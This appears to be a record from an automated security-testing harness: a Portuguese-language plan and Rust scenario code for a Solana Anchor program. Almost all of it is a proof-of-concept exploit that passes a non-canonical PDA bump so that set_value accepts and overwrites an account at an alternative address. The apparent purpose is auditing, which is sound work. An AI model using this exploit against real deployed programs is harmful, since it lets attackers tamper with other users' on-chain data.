attempts.raw:
{
  "plan": "O cenário monta uma conta DataAccount no PDA canônico derivado de [b"data", user, bump_canonico] e executa set_value com o bump canônico como baseline legítimo. Em seguida, o ataque repete a mesma chamada, mas fornece um bump não-canônico (menor que o canônico) que ainda produz um endereço válido via create_program_address, e passa uma conta DataAccount existente nesse endereço alternativo. O efeito medido é que a conta no endereço não-canônico foi aceita e teve seus campos user/value/bump sobrescritos, demonstrando que o programa não valida o bump canônico.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

let mut alt_bump: Option<u8> = None;
let mut alt_pda: Option<Pubkey> = None;
let mut b = canonical_bump;
while b > 0 {
    b -= 1;
    if let Ok(p) = Pubkey::create_program_address(&[b"data", user.as_ref(), &[b]], &env.program_id) {
        alt_bump = Some(b);
        alt_pda = Some(p);
        break;
    }
}

let canonical_data = anchor_account_data("DataAccount", &(user, 0u64, canonical_bump));
let canonical_account = account(&env.program_id, &canonical_data, None);

let baseline_ix = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let baseline_accounts = vec![
    (canonical_pda, canonical_account),
    (user, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("set_value legitimo no PDA canonico", &baseline_ix, &baseline_accounts);

if let (Some(ab), Some(ap)) = (alt_bump, alt_pda) {
    let alt_data = anchor_account_data("DataAccount", &(Pubkey::new_unique(), 0u64, ab));
    let alt_account = account(&env.program_id, &alt_data, None);

    let attack_ix = env.anchor_ix(
        "set_value",
        &(ab, 999u64),
        vec![
            AccountMeta::new(ap, false),
            AccountMeta::new_readonly(user, true),
        ],
    );
    let attack_accounts = vec![
        (ap, alt_account),
        (user, wallet(1_000_000_000)),
    ];
    let r = env.attack("set_value com bump nao-canonico em PDA alternativo", &attack_ix, &attack_accounts);
    if r.program_result == ProgramResult::Success {
        let data = after(&r, &ap).data();
        let stored_user = read_pubkey(data, 8);
        let stored_value = read_u64(data, 40);
        let stored_bump = data[48];
        env.effect("conta no PDA nao-canonico foi aceita e sobrescrita", stored_user == user && stored_value == 999u64 && stored_bump == ab);
    }
}"
}

